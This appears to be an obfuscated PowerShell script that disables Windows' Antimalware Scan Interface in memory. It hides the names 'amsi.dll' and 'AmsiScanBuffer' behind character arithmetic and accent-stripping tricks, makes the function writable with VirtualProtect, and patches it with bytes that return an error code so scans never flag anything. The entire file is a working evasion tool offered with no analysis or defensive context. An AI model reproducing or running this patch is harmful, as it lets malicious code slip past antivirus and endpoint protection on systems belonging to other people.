$md7IrABnplZ3OW63A5in = @"
using System;
using System.Runtime.InteropServices;
public class md7IrABnplZ3OW63A5in {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr nprwXy5MULcCfv, string FYK5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr jmPmci9AZsc, UIntPtr IJwJFYnLU7, uint QSiRIMKoLYkpJvLxWT5s, out uint Zto);
}
"@

Add-Type $md7IrABnplZ3OW63A5in

$WLyggOUzgOrMM1VRPM = [md7IrABnplZ3OW63A5in]::LoadLibrary("$([cHAr]([bYTe]0x61)+[cHAr](109)+[chaR](115*17/17)+[cHAr]([Byte]0x69)+[CHar](46)+[CHar](7+93)+[cHar](108*93/93)+[ChAR]([ByTE]0x6c))")
$CuZ = [md7IrABnplZ3OW63A5in]::GetProcAddress($WLyggOUzgOrMM1VRPM, "$(('ÁmsíScá'+'nBûffèr').normALIzE([chAR](70+51-51)+[cHAR]([Byte]0x6f)+[cHar]([ByTe]0x72)+[ChAr]([byte]0x6d)+[Char]([BytE]0x44)) -replace [ChAR](92)+[CHar](112+30-30)+[Char](123)+[CHAR](77)+[cHAR]([bYte]0x6e)+[CHaR](125))")
$p = 0
[md7IrABnplZ3OW63A5in]::VirtualProtect($CuZ, [uint32]5, 0x40, [ref]$p)
$qCj4fXY9S08G8p = "0xB8"
$KvSlLE = "0x57"
$ES3G9lLGnxVD = "0x00"
$NUU = "0x07"
$su4Mz = "0x80"
$LIp_aTxkoeQfzvebu = "0xC3"
$M_IPwGNsMupet = [Byte[]] ($qCj4fXY9S08G8p,$KvSlLE,$ES3G9lLGnxVD,$NUU,+$su4Mz,+$LIp_aTxkoeQfzvebu)
[System.Runtime.InteropServices.Marshal]::Copy($M_IPwGNsMupet, 0, $CuZ, 6)